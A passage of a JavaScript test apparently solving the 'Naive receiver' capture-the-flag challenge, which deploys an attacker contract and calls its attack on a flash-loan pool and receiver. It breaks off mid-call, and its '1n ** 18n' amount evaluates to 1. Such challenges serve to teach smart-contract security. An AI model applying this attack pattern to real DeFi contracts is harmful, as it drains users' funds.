...
describe('[Challenge] Naive receiver', function () {
  ...
  it('Execution', async function () {
    const NaiveReceiverAttacker = await ethers.getContractFactory(
      'NaiveReceiverAttacker',
      player
    );
    const naiveReceiverAttacker = await NaiveReceiverAttacker.deploy();
    const ETH = await pool.ETH();
    await naiveReceiverAttacker.attack(
      pool.address,
      receiver.address,
      ETH,
      1n ** 18n
